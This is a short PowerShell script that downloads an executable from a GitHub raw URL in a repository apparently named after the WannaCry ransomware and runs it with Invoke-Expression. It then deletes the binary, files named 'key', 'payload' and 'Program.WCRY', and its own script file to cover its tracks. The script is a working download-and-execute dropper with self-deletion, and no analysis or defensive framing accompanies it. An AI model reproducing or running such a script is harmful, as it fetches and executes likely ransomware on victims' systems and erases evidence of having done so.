$scriptName = $MyInvocation.MyCommand.Name
$url = 'https://raw.githubusercontent.com/bookbot2019/WCRY-OBS/main/Book.exe'
Invoke-WebRequest -Uri $url -Outfile "Book.exe"
$script = "./Book.exe"
Invoke-Expression $script
Remove-Item "Book.exe"
Remove-Item "key"
Remove-Item "payload"
Remove-Item "Program.WCRY"
Remove-Item $scriptName
